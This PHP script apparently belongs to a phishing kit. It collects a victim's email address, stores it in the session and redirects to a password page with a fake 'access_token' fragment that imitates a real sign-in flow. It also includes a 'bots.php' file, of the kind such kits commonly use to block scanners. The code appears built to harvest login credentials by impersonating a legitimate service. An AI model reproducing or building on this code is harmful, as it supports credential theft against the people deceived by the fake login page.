<?php
	
	include_once "../settings/conn.php";
	include_once "../settings/functions.php";
	include_once "../settings/bots.php";
	session_start();
	error_reporting(0);

	$emailv = $_POST['email'];
	$sub_email = $_POST['sub_mail'];

	if ($sub_email) 
	{
		if (!strstr($emailv, '@') == false) 
		{
			if (strlen($emailv) > 10) 
			{
				$_SESSION['email'] = $_POST['email'];
				echo "<script>window.location='login-pass#access_token=".$_SESSION['geraToken']."'</script>";
			}
			else echo '<span style="color: red;font-size: 12px;">Preencha o campo corretamente</span>';
		}
		else echo '<span style="color: red;font-size: 12px;">Preencha o campo corretamente</span>';
	}

?>

